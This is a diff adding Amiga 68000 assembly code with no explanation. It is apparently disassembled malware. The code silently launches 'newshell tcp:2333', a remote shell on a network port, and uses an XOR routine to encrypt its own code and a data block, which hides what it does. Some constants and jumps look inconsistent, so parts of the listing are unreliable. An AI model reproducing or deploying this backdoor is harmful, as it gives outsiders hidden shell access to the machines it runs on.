@@ -1,0 +1,86 @@
+
+_LVOUnLockDosList	EQU	-$294
+_LVOSupervisor	EQU	-$1E
+_LVOOpen	EQU	-$1E
+_LVOCloseLibrary	EQU	-$19E
+_LVOFindDosEntry	EQU	-$2AC
+_LVOExecute	EQU	-$DE
+_LVOLockDosList	EQU	-$28E
+_LVOClose	EQU	-$24
+****************************************************************************
+	MOVEM.L	D0-D7/A0-A6,-(SP)
+	MOVEA.L	(4).W,A6
+	BSR.W	lbC0000C8
+lbC00000C	MOVEQ	#4,D0
+	JSR	(-$32A,A6)
+	MOVEA.L	D0,A5
+	MOVEQ	#5,D1
+	JSR	(_LVOLockDosList,A5)
+	MOVE.L	D0,D5
+	BEQ.B	lbC000080
+	MOVE.L	D5,D1
+	BSR.B	lbC000026
+	MOVEQ	#$63,D2
+	MOVEQ	#0,D0
+lbC000026	MOVE.L	(SP)+,D2
+	MOVEQ	#4,D3
+	JSR	(_LVOFindDosEntry,A5)
+	MOVE.L	D0,D4
+	MOVEQ	#5,D1
+	JSR	(_LVOUnLockDosList,A5)
+	TST.W	D4
+	BEQ.B	lbC000080
+	BSR.B	lbC000042
+	TRAP	#9
+	dw	$4C3A
+	dw	0
+
+lbC000042	MOVE.L	(SP)+,D1
+	MOVE.L	#$3EE,D2
+	JSR	(_LVOOpen,A5)
+	MOVE.L	D0,D5
+	BEQ.B	lbC000080
+	BSR.B	lbC000070
+	db	'RUN >NIL: newshell tcp:2333',0
+
+lbC000070	MOVE.L	(SP)+,D1
+	MOVEQ	#0,D2
+	MOVE.L	D5,D3
+	JSR	(_LVOExecute,A5)
+	EXG	D1,D5
+	JSR	(_LVOClose,A5)
+lbC000080	EXG	A5,A1
+	JSR	(_LVOCloseLibrary,A6)
+	BRA.B	lbC0000C0
+
+lbL000088	dl	$829A95EE
+	dl	$A1BCB4BD
+	dl	$B4A0A5BD
+	dl	$F198B0A9
+	dl	$B8A0B8BA
+	dl	$B8BDF1ED
+	dl	$E2EEFCE3
+	dl	$FCEEB5A7
+	dl	$B5EEA8A1
+	dl	$A4EEB7A7
+	dl	$BFAAF1FF
+	dl	$F1AFBFAA
+	dl	$F1FCF1B7
+	dl	$B4BAEECE
+
+lbC0000C0	BSR.B	lbC0000C8
+	MOVEM.L	(SP)+,D0-D7/A0-A6
+	RTS
+
+lbC0000C8	LEA	(lbC00000C,PC),A0
+	LEA	(lbL000088,PC),A1
+	dw	$303C
+
+lbC0000D2	ADDA.L	A6,A0
+lbC0000D4	EOR.W	D0,(A0)+
+	CMPA.L	A0,A1
+	BNE.B	lbC0000D4
+	JSR	(-$27C,A6)
+	RTS
+
+	end
